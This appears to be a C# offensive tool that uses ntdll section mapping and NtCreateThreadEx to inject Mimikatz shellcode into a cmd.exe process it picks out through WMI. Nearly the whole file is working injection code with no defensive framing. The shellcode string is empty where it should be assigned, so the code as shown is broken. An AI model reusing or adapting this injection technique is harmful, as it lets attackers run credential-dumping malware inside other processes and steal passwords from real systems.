using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;
using System.Threading;

namespace CodeEx
{

public class code
{
					public static OSversion osVersionInfo = new OSversion { };

					[StructLayout(LayoutKind.Sequential)]
					public struct OSversion
					{
							public int dwMajorVersion;
							public int dwMinorVersion;
							public int dwBuildNumber;
					}

					[StructLayout(LayoutKind.Sequential)]
					public struct OBJECT_ATTRIBUTES
					{
						public ulong Length;
						public IntPtr RootDirectory;
						public IntPtr ObjectName;
						public ulong Attributes;
						public IntPtr SecurityDescriptor;
						public IntPtr SecurityQualityOfService;
					}

					[StructLayout(LayoutKind.Sequential)]
					public struct CLIENT_ID
					{
					    public IntPtr UniqueProcess;
					    public IntPtr UniqueThread;
					}

			    public enum NTSTATUS : uint
			    {
			        Success = 0x00000000,
			        Wait0 = 0x00000000
					};

					[Flags]
					public enum ACCESS_MASK : uint
					{
						DELETE = 0x00010000,
						READ_CONTROL = 0x00020000,
						WRITE_DAC = 0x00040000,
						WRITE_OWNER = 0x00080000,
						SYNCHRONIZE = 0x00100000,
						STANDARD_RIGHTS_REQUIRED = 0x000F0000,
						STANDARD_RIGHTS_READ = 0x00020000,
						STANDARD_RIGHTS_WRITE = 0x00020000,
						STANDARD_RIGHTS_EXECUTE = 0x00020000,
						STANDARD_RIGHTS_ALL = 0x001F0000,
						SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
						ACCESS_SYSTEM_SECURITY = 0x01000000,
						MAXIMUM_ALLOWED = 0x02000000,
						GENERIC_READ = 0x80000000,
						GENERIC_WRITE = 0x40000000,
						GENERIC_EXECUTE = 0x20000000,
						GENERIC_ALL = 0x10000000,
						DESKTOP_READOBJECTS = 0x00000001,
						DESKTOP_CREATEWINDOW = 0x00000002,
						DESKTOP_CREATEMENU = 0x00000004,
						DESKTOP_HOOKCONTROL = 0x00000008,
						DESKTOP_JOURNALRECORD = 0x00000010,
						DESKTOP_JOURNALPLAYBACK = 0x00000020,
						DESKTOP_ENUMERATE = 0x00000040,
						DESKTOP_WRITEOBJECTS = 0x00000080,
						DESKTOP_SWITCHDESKTOP = 0x00000100,
						WINSTA_ENUMDESKTOPS = 0x00000001,
						WINSTA_READATTRIBUTES = 0x00000002,
						WINSTA_ACCESSCLIPBOARD = 0x00000004,
						WINSTA_CREATEDESKTOP = 0x00000008,
						WINSTA_WRITEATTRIBUTES = 0x00000010,
						WINSTA_ACCESSGLOBALATOMS = 0x00000020,
						WINSTA_EXITWINDOWS = 0x00000040,
						WINSTA_ENUMERATE = 0x00000100,
						WINSTA_READSCREEN = 0x00000200,
						WINSTA_ALL_ACCESS = 0x0000037F
					}

					public enum CONTEXT_FLAGS : uint
					{
					   CONTEXT_i386 = 0x10000,
					   CONTEXT_i486 = 0x10000,
					   CONTEXT_CONTROL = CONTEXT_i386 | 0x01,
					   CONTEXT_INTEGER = CONTEXT_i386 | 0x02,
					   CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04,
					   CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08,
					   CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10,
					   CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20,
					   CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
					   CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |  CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS |  CONTEXT_EXTENDED_REGISTERS
					}

					public struct STARTUPINFO
					{
							public int cb;
							public string lpReserved;
							public string lpDesktop;
							public string lpTitle;
							public int dwX;
							public int dwY;
							public int dwXSize;
							public int dwYSize;
							public int dwXCountChars;
							public int dwYCountChars;
							public int dwFillAttribute;
							public int dwFlags;
							public short wShowWindow;
							public short cbReserved2;
							public int lpReserved2;
							public IntPtr hStdInput;
							public IntPtr hStdOutput;
							public IntPtr hStdError;
					}

					public struct PROCESS_INFORMATION
					{
							public IntPtr hProcess;
							public IntPtr hThread;
							public int dwProcessId;
							public int dwThreadId;
					}

					[StructLayout(LayoutKind.Sequential, Pack=0)]
					public struct UNICODE_STRING
					{
					    public ushort Length;
					    public ushort MaximumLength;
					    public IntPtr Buffer;

					}

					[Flags]
					public enum HandleFlags : uint
					{
					   None = 0,
					   INHERIT = 1
					}

					[StructLayout(LayoutKind.Sequential)]
					public struct PROCESS_BASIC_INFORMATION
					{
					    public IntPtr ExitStatus;
					    public IntPtr PebBaseAddress;
					    public IntPtr AffinityMask;
					    public IntPtr BasePriority;
					    public IntPtr UniqueProcessId;
					    public IntPtr InheritedFromUniqueProcessId;
					}

					public enum PROCESS_INFORMATION_CLASS : int
					{
							ProcessBasicInformation = 0,
							ProcessQuotaLimits,
							ProcessIoCounters,
							ProcessVmCounters,
							ProcessTimes,
							ProcessBasePriority,
							ProcessRaisePriority,
							ProcessDebugPort,
							ProcessExceptionPort,
							ProcessAccessToken,
							ProcessLdtInformation,
							ProcessLdtSize,
							ProcessDefaultHardErrorMode,
							ProcessIoPortHandlers,
							ProcessPooledUsageAndLimits,
							ProcessWorkingSetWatch,
							ProcessUserModeIOPL,
							ProcessEnableAlignmentFaultFixup,
							ProcessPriorityClass,
							ProcessWx86Information,
							ProcessHandleCount,
							ProcessAffinityMask,
							ProcessPriorityBoost,
							MaxProcessInfoClass,
							ProcessWow64Information = 26
					};

					[StructLayout(LayoutKind.Sequential)]
					public struct SECTION_DATA
					{
							public Boolean isvalid;
							public IntPtr SectionHandle;
							public IntPtr pBase;
					}


					            		public static byte [] CoreFind( uint Size)
					            		{


					            				string data =

    				char[] charstr = data.ToCharArray();
    				string str = new string(charstr);
    				string tmp = "";
    				byte [] SArray = new byte [Size]; // length of Mimikatz shellcode bytes
    				int idx = 0;
    				byte[] buf = { 000 };
    				GCHandle pinnedObject = GCHandle.Alloc(str, GCHandleType.Pinned);
    				IntPtr ptr = pinnedObject.AddrOfPinnedObject();
    				pinnedObject.Free();

    				for (int i = 0; i <= (Size-1); i++)
    				{
    						for (int k = 0; k <= 2; k++) // each shellcode is 3 digits ex. 232 144 001
    						{
    								buf[0] = Marshal.ReadByte( ptr + idx );
    								tmp = tmp + System.Text.Encoding.UTF8.GetString( buf );
    								idx++;
    						}
    						SArray[ i ] = Byte.Parse( tmp );
    						tmp = "";
    				}
    				return SArray;
    		 }

			public static void CoreVersion( ref OSversion info )
			{
					IntPtr KUSER_SHARED_DATA = new IntPtr( 0x7FFE0000 );
					IntPtr ptrMajorVersion = (IntPtr)( KUSER_SHARED_DATA + 0x026C );
					info.dwMajorVersion = Marshal.ReadInt32( ptrMajorVersion );
					IntPtr ptrMinorVersion = (IntPtr)( KUSER_SHARED_DATA + 0x0270 );
					info.dwMinorVersion = Marshal.ReadInt32( ptrMinorVersion );
					IntPtr ptrBuildNumber = (IntPtr)( KUSER_SHARED_DATA + 0x0260 );
					info.dwBuildNumber = Marshal.ReadInt32( ptrBuildNumber );
			}


	     public static int FindTheRightPID(string process, string arg1, string arg2, string arg3, ref CLIENT_ID clientid )
	     {
	       int result = 0;
	       ManagementClass mClass = new ManagementClass("Win32_Process");
	       foreach (ManagementObject mObj in mClass.GetInstances())
	       {
	           if ( mObj["Name"].Equals(process) )
	           {
	               string str1 = Convert.ToString( mObj["CommandLine"] );
	               if (str1.Contains(arg1) & str1.Contains(arg2) & str1.Contains(arg3))
	               {
	                   result = (int)Convert.ToInt32(mObj["ProcessId"]);
	                   Process targetProcess = Process.GetProcessById( result );
	                   clientid.UniqueThread = new IntPtr(targetProcess.Threads[0].Id);
	                   clientid.UniqueProcess = new IntPtr(targetProcess.Id);
	                   break;
	               }
	           }
	       }
	       return result;
	     }

			[DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
			static extern UInt32 NtCreateSection( ref IntPtr SectionHandle, Int32 DesiredAccess, IntPtr ObjectAttributes, ref Int32 MaximumSize, Int32 SectionPageProtection, Int32 AllocationAttributes, IntPtr FileHandle );

			[DllImport("ntdll.dll", SetLastError=true)]
			static extern uint NtMapViewOfSection( IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out long SectionOffset, out int ViewSize, int InheritDisposition, int AllocationType, int Win32Protect );

			[DllImport("ntdll.dll", SetLastError=true)]
			static extern NTSTATUS NtCreateThreadEx( ref IntPtr threadHandle, Int32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList );

			[DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
			static extern int NtClose(IntPtr hObject);

			[DllImport("ntdll.dll", SetLastError=true)]
			static extern NTSTATUS NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);


    public static void Main()
    {
				// Get Windows BuildNumber
				CoreVersion( ref osVersionInfo );
				// Size of Mimikatz
				Int32 Size = 1357745;
				IntPtr SectionHandle = IntPtr.Zero;
				Int32 ScectionDataSize = Size;

				CLIENT_ID clientid = new CLIENT_ID();
				int ProcId = FindTheRightPID("cmd.exe", "coffee", "", "", ref clientid);

				IntPtr targetHandle = IntPtr.Zero;
				OBJECT_ATTRIBUTES Attrib = new OBJECT_ATTRIBUTES();

				NtOpenProcess(ref targetHandle, 0x1F0FFF, ref Attrib, ref clientid );

				NtCreateSection( ref SectionHandle, 0xE, IntPtr.Zero, ref ScectionDataSize, 0x40, 0x8000000, IntPtr.Zero );

				IntPtr localSectionAddress = IntPtr.Zero;
				long localSectionOffset = 0;
				NtMapViewOfSection( SectionHandle, (IntPtr)(-1), ref localSectionAddress, IntPtr.Zero, IntPtr.Zero, out localSectionOffset, out ScectionDataSize, 0x2, 0x0, 0x04 );

				IntPtr remoteSectionAddress = IntPtr.Zero;
				NtMapViewOfSection( SectionHandle, targetHandle, ref remoteSectionAddress, IntPtr.Zero, IntPtr.Zero, out localSectionOffset, out ScectionDataSize, 0x2, 0x0, 0x20 );
				Marshal.Copy( CoreFind( (uint)Size ), 0, localSectionAddress, Size );

				IntPtr RemoteThread = IntPtr.Zero;
				NtCreateThreadEx( ref RemoteThread, 0x1FFFFF, IntPtr.Zero, targetHandle, remoteSectionAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero );

				NtClose( targetHandle );
				NtClose( SectionHandle );
				NtClose( remoteSectionAddress );
				NtClose( localSectionAddress );
				NtClose( RemoteThread );
		}
  }
}